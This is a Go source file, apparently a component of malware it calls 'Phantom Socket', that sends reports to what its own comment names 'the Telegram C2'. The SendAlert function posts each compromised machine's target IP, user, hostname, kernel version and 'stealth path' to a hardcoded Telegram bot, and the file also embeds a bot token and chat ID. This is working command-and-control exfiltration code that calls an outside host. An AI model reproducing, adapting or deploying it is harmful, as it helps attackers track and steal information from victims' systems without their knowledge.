// Package telegram - Telegram alerting for Phantom Socket infrastructure.
package telegram

import (
	"fmt"
	"net/http"
	"net/url"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var (
	botToken = "8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
	chatID   = "5439698489"
)

func getKernelVersion() string {
	if runtime.GOOS == "windows" {
		return "Windows"
	}
	out, err := exec.Command("uname", "-r").Output()
	if err != nil {
		return "Unknown"
	}
	return strings.TrimSpace(string(out))
}

// AlertData represents the structured content for a system alert.
type AlertData struct {
	EventType string
	Hostname  string
	User      string
	IP        string
	FilePath  string
	Details   string
}

// SendAlert sends a structured HTML report to the Telegram C2.
func SendAlert(data AlertData) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	report := fmt.Sprintf(
		"SYSTEM ALERT: [%s]\n"+
			"------------------------------------------------------------\n"+
			"TARGET IP    : %s\n"+
			"USER         : %s\n"+
			"HOSTNAME     : %s\n"+
			"KERNEL VER   : %s\n"+
			"ACTION       : %s\n"+
			"STEALTH PATH : %s\n"+
			"TIMESTAMP    : %s\n"+
			"------------------------------------------------------------\n"+
			"INFO         : %s",
		data.EventType,
		data.IP,
		data.User,
		data.Hostname,
		getKernelVersion(),
		data.EventType,
		data.FilePath,
		time.Now().Format("2006-01-02 15:04:05"),
		data.Details,
	)

	vals := url.Values{}
	vals.Set("chat_id", chatID)
	vals.Set("text", report)
	vals.Set("parse_mode", "HTML")
	vals.Set("disable_web_page_preview", "true")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.PostForm(apiURL, vals)
	if err != nil {
		return fmt.Errorf("transport failure: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("api rejected request: %s", resp.Status)
	}

	return nil
}
